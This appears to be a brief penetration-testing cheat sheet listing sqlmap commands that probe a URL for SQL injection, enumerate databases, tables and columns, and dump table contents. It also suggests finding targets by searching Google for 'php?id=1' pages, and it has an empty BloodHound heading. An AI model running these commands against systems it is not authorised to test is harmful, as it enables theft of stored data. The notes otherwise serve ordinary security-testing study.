---
title: 'Databases'
---

- [SQLmap](#sqlmap)
- [BloodHound](#bloodhound)

## SQLmap

```bash
# Google for php?id=1

$ sqlmap -u <url>.php?id=1

--db(m)s
--forms # if a form on page
-a # everything

# databases
$ sqlmap -u <url> --forms -dbs

# tables in database
$ sqlmap -u <url> --forms -D <database> --tables

# columns in table in database
$ sqlmap -u <url> --forms -D <database> -T <table> --columns

# dump table
$ sqlmap -u <url> --forms -D <database> -T <table> --dump
```

## BloodHound